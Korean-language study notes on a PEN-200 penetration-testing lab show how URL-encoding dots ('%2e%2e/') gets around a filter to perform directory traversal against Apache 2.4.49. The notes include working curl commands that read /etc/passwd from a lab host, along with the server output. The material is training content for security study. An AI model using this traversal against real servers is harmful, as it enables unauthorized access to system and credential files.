# 9.1.3 특수 문자 인코딩 처리

> **Encoding Special Characters** · PEN-200 §9.1.3

앞 절의 개념을 실제 취약점에 적용해 봄. 취약점 스캐닝 단위에서 발견한 Apache 2.4.49 의 디렉터리 탐색 취약점이 대상이고, URL 에서 `cgi-bin` 디렉터리를 지정한 «뒤에» 상대 경로를 붙이는 것이 익스플로잇 조건임.

> ⚠️ **교재 표기 불일치** — 같은 대상을 앞 문장에서는 SAMBA 머신, 뒤 문장에서는 WEB18 머신으로 부름. 실제로 치는 대상은 `192.168.50.16` 이고 이는 §21.1.3 이 WEB18 로 익스플로잇하는 IP 와 같음. 반면 §7.3.1 의 NSE 스캔이 Apache 2.4.49 를 잡은 SAMBA 머신은 `192.168.50.124` 임 — 교재가 서로 다른 두 머신을 하나처럼 이어 서술한 것 `[가정]`.

`../` 를 그대로 쓴 시도는 개수를 바꿔 봐도 404 만 돌아옴.

```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-
bin/../../../../../../../../../../etc/passwd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

*`../` 를 그대로 쓴 시도 — 두 번 모두 실패*

**실패 원인은 경로가 아니라 필터임.** `../` 는 널리 알려진 남용 패턴이라 웹 서버·웹 애플리케이션 방화벽·애플리케이션 자체 중 어느 한 곳에서 걸러지는 경우가 많음. 이때 쓰는 것이 URL 인코딩(퍼센트 인코딩)임. 여기서는 점만 인코딩하면 되고, 점은 `%2e` 로 표현됨.

```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-
bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```

*점을 인코딩한 디렉터리 탐색 — 성공*

**우회가 성립하는 이유** — 필터가 `../` 같은 평문 표현만 검사하고 `%2e%2e/` 같은 인코딩 표현은 놓치기 때문임. 필터를 통과한 뒤에는 애플리케이션이나 서버가 인코딩된 문자를 정상 요청으로 해석해 실행함. URL 인코딩은 본래 요청 문자를 전송 가능한 형태로 바꾸는 용도이나, 이 해석 시점 차이 때문에 악용 수단으로도 쓰임.
